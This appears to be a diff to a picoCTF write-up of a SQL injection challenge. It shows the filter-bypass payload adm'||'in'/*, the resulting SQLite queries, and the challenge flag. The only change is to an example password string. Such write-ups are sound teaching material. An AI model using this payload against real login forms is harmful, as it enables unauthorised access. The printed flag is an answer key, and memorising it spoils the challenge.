@@ -35,7 +35,7 @@ In SQLITE, || is a concatenation operator. The simple solution is to simply spli
 
 input: ``` adm'||'in'/* ```
 
-``` SELECT * FROM users WHERE username='adm'||'in'/* AND password='admin' ```
+``` SELECT * FROM users WHERE username='adm'||'in'/* AND password='controller' ```
 
 ### Round 5 - filter: or and = like > < – union admin
 
@@ -43,6 +43,6 @@ Splitting up “admin” still works as only UNION is additionally blacklisted.
 
 input: ``` adm'||'in'/* ```
 
-``` SELECT * FROM users WHERE username='adm'||'in'/* AND password='admin' ```
+``` SELECT * FROM users WHERE username='adm'||'in'/* AND password='controller' ```
 ## Flag
 picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}
